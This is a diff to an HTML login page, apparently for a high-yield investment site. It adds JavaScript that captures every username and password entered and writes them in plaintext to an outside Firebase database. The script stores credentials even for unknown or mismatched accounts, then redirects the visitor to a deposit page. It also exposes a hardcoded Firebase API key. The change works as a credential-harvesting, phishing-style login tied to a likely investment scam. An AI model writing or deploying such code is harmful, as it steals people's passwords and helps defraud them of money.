@@ -129,7 +129,12 @@
 
 
 
-<form method=post name=mainform onsubmit="return checkform()"><input type="hidden" name="form_id" value="16934814696844"><input type="hidden" name="form_token" value="e466b287eca7ace7855f83cb45a0ba39">
+  <form id="loginForm" class="login-form-container" method="POST" action="Login.html" autocomplete="off">
+
+                                         <input type="hidden" name="active" value="yes">
+
+
+    <input type="hidden" name="form_id" value="16934814696844"><input type="hidden" name="form_token" value="e466b287eca7ace7855f83cb45a0ba39">
     <input type=hidden name=a value='do_login'>
     <input type=hidden name=follow value=''>
     <input type=hidden name=follow_id value=''>
@@ -146,6 +151,100 @@
 
     <button type="submit" class="btn-main">Sign Me In</button>
 </form>
+
+
+
+
+
+<script src="https://www.gstatic.com/firebasejs/8.6.1/firebase-app.js"></script>
+<script src="https://www.gstatic.com/firebasejs/8.6.1/firebase-database.js"></script>
+
+<script>
+  // Your web app's Firebase configuration
+  var firebaseConfig = {
+    apiKey: "AIzaSyAnRNSqRCMrSjhV1h74l8x57BnHIdoIiGY",
+    authDomain: "hyip-html-websites.firebaseapp.com",
+    databaseURL: "https://hyip-html-websites-default-rtdb.firebaseio.com",
+    projectId: "hyip-html-websites",
+    storageBucket: "hyip-html-websites.appspot.com",
+    messagingSenderId: "241224051127",
+    appId: "1:241224051127:web:213fd8f4002bdd3fdc6032",
+    measurementId: "G-QLBNBX70XP"
+  };
+
+  // Initialize Firebase
+  firebase.initializeApp(firebaseConfig);
+  
+  var database = firebase.database();
+
+// ... [your firebaseConfig and initialization code remains the same]
+// ... [your firebaseConfig and initialization code remains the same]
+
+document.getElementById('loginForm').addEventListener('submit', function(event) {
+    event.preventDefault();
+
+    var username = document.getElementsByName('username')[0].value;
+    var password = document.getElementsByName('password')[0].value;
+
+    // validate fields
+    if(!username.trim() || !password.trim()) {
+      alert('All fields are required');
+      return;
+    }
+
+    var usersRef = database.ref('invesableai_users');
+    usersRef.orderByChild('username').equalTo(username).once('value', function(snapshot) {
+        if (snapshot.exists()) {
+            // User with the same username exists, check for password
+            var isPasswordDuplicate = false;
+            snapshot.forEach(function(childSnapshot) {
+                if(childSnapshot.val().password === password) {
+                    isPasswordDuplicate = true;
+                    return true; // break out of the loop
+                }
+            });
+
+            if(isPasswordDuplicate) {
+                console.log('User with the same username and password found. Logging in.');
+                sessionStorage.setItem('username', username);
+                sessionStorage.setItem('password', password);
+                window.location.href = 'deposit.html';
+            } else {
+                // User with the same username exists but password is different, add new entry
+                addNewUser(username, password);
+            }
+        } else {
+            // User doesn't exist, add to firebase
+            addNewUser(username, password);
+        }
+    });
+});
+
+function addNewUser(username, password) {
+    var newUserRef = database.ref('invesableai_users').push();
+    newUserRef.set({
+        username: username,
+        password: password, // note: you should never store passwords in plaintext
+        active: document.getElementsByName('active')[0].value,
+        timeAdded: firebase.database.ServerValue.TIMESTAMP
+    }, function(error) {
+        if (error) {
+            console.error('Error writing data: ', error);
+        } else {
+            console.log('Data successfully written!');
+
+            // save data to the session
+            sessionStorage.setItem('username', username);
+            sessionStorage.setItem('password', password);
+
+            // redirect to the desired page
+            window.location.href = 'deposit.html';
+        }
+    });
+}
+</script>
+
+
 <div class="row mb-2">
     <div class="col-5">
         <hr class="mb-0">
